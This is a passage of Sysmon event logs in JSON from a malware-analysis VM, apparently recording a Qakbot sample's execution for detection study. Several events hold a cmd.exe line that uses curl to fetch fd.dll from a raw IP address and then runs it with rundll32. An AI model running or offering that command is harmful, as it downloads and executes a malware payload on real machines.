Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:06.957\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"-","UtcTime":"2023-03-02 16:38:21.548","ProcessGuid":"159466bb-d0fd-6400-4901-000000000f00","ProcessId":9556,"Image":"C:\\Windows\\SysWOW64\\curl.exe","TargetFilename":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll","CreationUtcTime":"2023-03-02 16:38:06.957","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.569Z","TimeGenerated":"2023-03-02T04:38:21.569Z","EventRecordID":"57649","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:21.564\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf\r\nCreationUtcTime: 2023-03-02 16:38:06.973\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.564\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:06.973\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:21.564","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf","CreationUtcTime":"2023-03-02 16:38:06.973","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.570Z","TimeGenerated":"2023-03-02T04:38:21.570Z","EventRecordID":"57650","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:21.564\r\nProcessGuid: {159466bb-d0fd-6400-4701-000000000f00}\r\nProcessId: 4628\r\nImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.564\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4701-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e4628\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:21.564","ProcessGuid":"159466bb-d0fd-6400-4701-000000000f00","ProcessId":4628,"Image":"C:\\Windows\\SysWOW64\\cmd.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.571Z","TimeGenerated":"2023-03-02T04:38:21.571Z","EventRecordID":"57651","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1218.002,technique_name=rundll32.exe\r\nUtcTime: 2023-03-02 16:38:21.570\r\nProcessGuid: {159466bb-d0fd-6400-4a01-000000000f00}\r\nProcessId: 1908\r\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: rundll32  fd.dll,N115\r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A\r\nParentProcessGuid: {159466bb-d0fd-6400-4701-000000000f00}\r\nParentProcessId: 4628\r\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1218.002,technique_name=rundll32.exe\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.570\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4a01-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1908\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.746 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows host process (Rundll32)\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eRUNDLL32.EXE\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003erundll32  fd.dll,N115\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0fd-6400-4701-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e4628\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1218.002,technique_name=rundll32.exe","UtcTime":"2023-03-02 16:38:21.570","ProcessGuid":"159466bb-d0fd-6400-4a01-000000000f00","ProcessId":1908,"Image":"C:\\Windows\\SysWOW64\\rundll32.exe","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"rundll32  fd.dll,N115","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A","ParentProcessGuid":"159466bb-d0fd-6400-4701-000000000f00","ParentProcessId":4628,"ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:23.046Z","TimeGenerated":"2023-03-02T04:38:23.046Z","EventRecordID":"57652","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:23.044\r\nProcessGuid: {159466bb-d0fd-6400-4a01-000000000f00}\r\nProcessId: 1908\r\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:23.044\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4a01-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1908\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:23.044","ProcessGuid":"159466bb-d0fd-6400-4a01-000000000f00","ProcessId":1908,"Image":"C:\\Windows\\SysWOW64\\rundll32.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:23.048Z","TimeGenerated":"2023-03-02T04:38:23.048Z","EventRecordID":"57653","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:23.044\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf\r\nCreationUtcTime: 2023-03-02 16:38:13.336\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:23.044\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:23.044","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf","CreationUtcTime":"2023-03-02 16:38:13.336","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:23.050Z","TimeGenerated":"2023-03-02T04:38:23.050Z","EventRecordID":"57654","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:23.048\r\nProcessGuid: {159466bb-d0fd-6400-4701-000000000f00}\r\nProcessId: 4628\r\nImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:23.048\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4701-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e4628\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:23.048","ProcessGuid":"159466bb-d0fd-6400-4701-000000000f00","ProcessId":4628,"Image":"C:\\Windows\\SysWOW64\\cmd.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:23.051Z","TimeGenerated":"2023-03-02T04:38:23.051Z","EventRecordID":"57655","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:23.048\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf\r\nCreationUtcTime: 2023-03-02 16:38:13.336\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:23.048\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:23.048","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf","CreationUtcTime":"2023-03-02 16:38:13.336","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:24.333Z","TimeGenerated":"2023-03-02T04:38:24.333Z","EventRecordID":"57656","EventID":7,"Message":"Image loaded:\r\nRuleName: technique_id=T1218.005,technique_name=MSHTA with AMSI Bypass\r\nUtcTime: 2023-03-02 16:38:24.308\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\jscript9.dll\r\nFileVersion: 11.00.19041.2251 (WinBuild.160101.0800)\r\nDescription: Microsoft ® JScript\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: jscript9.dll\r\nHashes: SHA1=C77A3E920AB1CD7C38E52DE4EA58432EF1AB5C62,MD5=435867A5CDAE3265A27E91D38EB4368F,SHA256=77F81AE733807037920760BD43EDBB2BF6220F19C5A1B97E45EF03EBF29E85B0,IMPHASH=2A4AA2BF50C18D4670C4C746AD402E94\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1218.005,technique_name=MSHTA with AMSI Bypass\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:24.308\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\jscript9.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e11.00.19041.2251 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft ® JScript\u003c/Data\u003e\u003cData Name=\"Product\"\u003eInternet Explorer\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003ejscript9.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=C77A3E920AB1CD7C38E52DE4EA58432EF1AB5C62,MD5=435867A5CDAE3265A27E91D38EB4368F,SHA256=77F81AE733807037920760BD43EDBB2BF6220F19C5A1B97E45EF03EBF29E85B0,IMPHASH=2A4AA2BF50C18D4670C4C746AD402E94\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"technique_id=T1218.005,technique_name=MSHTA with AMSI Bypass","UtcTime":"2023-03-02 16:38:24.308","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\jscript9.dll","FileVersion":"11.00.19041.2251 (WinBuild.160101.0800)","Description":"Microsoft ® JScript","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"jscript9.dll","Hashes":"SHA1=C77A3E920AB1CD7C38E52DE4EA58432EF1AB5C62,MD5=435867A5CDAE3265A27E91D38EB4368F,SHA256=77F81AE733807037920760BD43EDBB2BF6220F19C5A1B97E45EF03EBF29E85B0,IMPHASH=2A4AA2BF50C18D4670C4C746AD402E94","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:24.358Z","TimeGenerated":"2023-03-02T04:38:24.358Z","EventRecordID":"57657","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:24.346\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:24.346\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:24.346","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\mshta.exe","Details":"Binary Data","User":"FLAREVM\\malware"},